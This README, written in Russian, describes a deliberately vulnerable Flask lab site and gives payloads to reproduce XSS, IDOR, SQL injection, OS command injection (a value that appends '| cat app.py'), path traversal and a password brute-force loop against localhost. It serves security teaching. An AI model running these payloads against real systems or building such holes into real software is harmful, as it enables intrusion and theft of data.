# VVery-Bad-flask-app

### Уязвимый веб-сайт, написанный на Flask

Данный сайт иллюстрирует несколько распространенных уязвимостей:

a. XSS
b. IDOR
c. SQLI
d. OS command injection
e. Path Traversal
f. Brute force

На сайте представлены страницы, соответстсвующие перечисленным уязвимостям. Также, если "дополнительные" проблемы, типа использования слабых алгоритмов хэширования или хранение захардкоженных кредов. 
В базе данных используется две table для иллюстрации уязвимотсей: users и books.
#### Запуск

Выполняем следующие команды: 

```
mkdir -p temp
flask --app app run
```

По дефолту сайт запускается на 127.0.0.1:5000
#### XSS

Страница предоставляет поиск по базе данных, содержащей различные книги. Чтобы воспроизвести уязвимость вносим в поле поиска: 
http://127.0.0.1:5000/pathtraversalimg?img=../../app.py
```
<script>alert("e he he")</script>
```

#### IDOR 

На странице представлены логин и пароль, по которым можно "войти" в систему. 
Как только мы успешно входим, можно увидеть, что у нас появились пользовательские cookies - user_id и session_token. 

Можно догадаться, что user_id соответсвует порядковый номер (индекс) пользователя в базе данных. Меняем user_id на число 1 или 3, перезагружаем страницу и получаем аккаунт другого пользователя, пропуская шаги валидации пароля. 

#### SQLI

Попробуем ввести рандомный пароль, а в поле "Имя пользователя":

```
admin' OR '1'='1
```

После чего успешно "входим" в систему.

#### OS command injection

Запустим следующий curl-запрос: 

```
curl -g 'http://127.0.0.1:5000/os?hostname=8.8.8.8%20-c%203%20|%20cat%20app.py'
```

Видим, что команда исполняется на сервере, где хостится веб-сайт и получаем исходный код. Вместо исходного кода, можем выполнять любые другие команды на сервере. 

#### Path Traversal

Исследуя страницу, видим, что картинка с котом загружается следюущим образом: 
http://127.0.0.1:5000/pathtraversalimg?img=../../app.py
```
http://127.0.0.1:5000/pathtraversalimg?img=666.jpg
```

Попробуем "погулять" по серверу: 

```
http://127.0.0.1:5000/pathtraversalimg?img=../../app.py
```

#### Brute Force

Создадим скрипт:

```
file=./pass.txt  
ip=127.0.0.1:5000/bruteforce  
  
while read -r line; do  
	echo $line  
	curl $ip -d "username=admin&password=$line" -v 2>&1 | grep "200 OK"  
done < "$file"
```
Запускаем скрипт, который подбирает пароль к администраторской учетной записи. Можно самостоятельно создать pass.txt или заменить его на любые готовые словари. 

Hint: пароль будет admin 
